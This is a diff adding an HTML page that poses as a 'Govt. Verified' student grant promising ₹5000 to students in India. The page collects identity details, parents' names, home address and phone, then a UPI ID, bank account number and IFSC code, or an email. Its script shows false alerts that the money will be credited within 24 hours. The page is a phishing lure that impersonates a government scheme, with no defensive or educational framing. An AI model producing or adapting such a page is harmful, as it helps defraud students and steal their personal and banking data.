@@ -1,0 +1,171 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Government Grant for Students</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      background: #ffffff;
+      color: #333;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 6px 30px rgba(0, 0, 0, 0.4);
+      width: 100%;
+      max-width: 550px;
+      text-align: center;
+      transition: all 0.4s ease;
+    }
+    h2 {
+      margin-top: 0;
+    }
+    .section {
+      margin-bottom: 20px;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+    button {
+      background-color: #1e88e5;
+      color: white;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #0d47a1;
+    }
+    .hidden {
+      display: none;
+    }
+    .fade {
+      animation: fadeIn 0.8s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container fade">
+    <div id="step1">
+      <h2>🎓 Student Financial Grant (Govt. Verified)</h2>
+      <p>✅ If you are a school/college student in India, you are eligible.</p>
+      <p>💰 You will receive ₹5000 upon successful verification.</p>
+      <button onclick="showForm()">Apply Now</button>
+    </div><div id="step2" class="hidden">
+  <h2>Verify Your Student Identity</h2>
+  <input id="name" type="text" placeholder="Full Name" />
+  <input id="dob" type="date" />
+  <input id="school" type="text" placeholder="School/College Name" />
+  <input id="year" type="text" placeholder="Year (e.g., 1st Year, 10th Std)" />
+  <input id="school_address" type="text" placeholder="Institution Address" />
+  <input id="father" type="text" placeholder="Father's Name" />
+  <input id="mother" type="text" placeholder="Mother's Name" />
+  <input id="address" type="text" placeholder="Your Residential Address" />
+  <input id="contact" type="tel" placeholder="Contact Number (10 digits)" />
+  <button onclick="validateStudentForm()">Continue</button>
+</div>
+
+<div id="step3" class="hidden">
+  <h2>🎉 You Are Eligible for ₹5000!</h2>
+  <p>Select your preferred method to receive funds:</p>
+  <button onclick="showOption('upi')">UPI</button>
+  <button onclick="showOption('bank')">Bank Transfer</button>
+  <button onclick="showOption('google')">Google Redeem Code</button>
+
+  <div id="upi" class="hidden section">
+    <input type="text" placeholder="Enter your UPI ID" id="upi_input" />
+    <button onclick="validateUPI()">Submit</button>
+  </div>
+
+  <div id="bank" class="hidden section">
+    <input type="text" placeholder="Bank Name" id="bank_name" />
+    <input type="text" placeholder="Account Number" id="account_no" />
+    <input type="text" placeholder="IFSC Code" id="ifsc" />
+    <button onclick="validateBank()">Submit</button>
+  </div>
+
+  <div id="google" class="hidden section">
+    <input type="email" placeholder="Enter your Email" id="email_id" />
+    <button onclick="validateEmail()">Submit</button>
+  </div>
+</div>
+
+  </div>  <script>
+    function showForm() {
+      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('step2').classList.remove('hidden');
+    }
+
+    function validateStudentForm() {
+      const required = ['name', 'dob', 'school', 'year', 'school_address', 'father', 'mother', 'address', 'contact'];
+      let valid = true;
+      required.forEach(id => {
+        const val = document.getElementById(id).value.trim();
+        if (!val) valid = false;
+      });
+      const contact = document.getElementById('contact').value.trim();
+      if (!/^\d{10}$/.test(contact)) valid = false;
+
+      if (!valid) {
+        alert("⚠️ Please fill in all details correctly.");
+        return;
+      }
+      document.getElementById('step2').classList.add('hidden');
+      document.getElementById('step3').classList.remove('hidden');
+    }
+
+    function showOption(option) {
+      ['upi', 'bank', 'google'].forEach(id => {
+        document.getElementById(id).classList.add('hidden');
+      });
+      document.getElementById(option).classList.remove('hidden');
+    }
+
+    function validateUPI() {
+      const upi = document.getElementById('upi_input').value.trim();
+      if (!/^[\w.-]+@[\w.-]+$/.test(upi)) {
+        alert("⚠️ Invalid UPI ID");
+        return;
+      }
+      alert("✅ Money will be credited to your UPI ID within 24 hours.");
+    }
+
+    function validateBank() {
+      const name = document.getElementById('bank_name').value.trim();
+      const acc = document.getElementById('account_no').value.trim();
+      const ifsc = document.getElementById('ifsc').value.trim();
+      if (!name || !/^\d{9,18}$/.test(acc) || !/^[A-Z]{4}0[A-Z0-9]{6}$/i.test(ifsc)) {
+        alert("⚠️ Please enter valid bank details.");
+        return;
+      }
+      alert("✅ Money will be credited to your bank account within 24 hours.");
+    }
+
+    function validateEmail() {
+      const email = document.getElementById('email_id').value.trim();
+      if (!/^\S+@\S+\.\S+$/.test(email)) {
+        alert("⚠️ Invalid Email Address");
+        return;
+      }
+      alert("✅ Google Play code will be sent to your email within 24 hours.");
+    }
+  </script></body>
+</html>
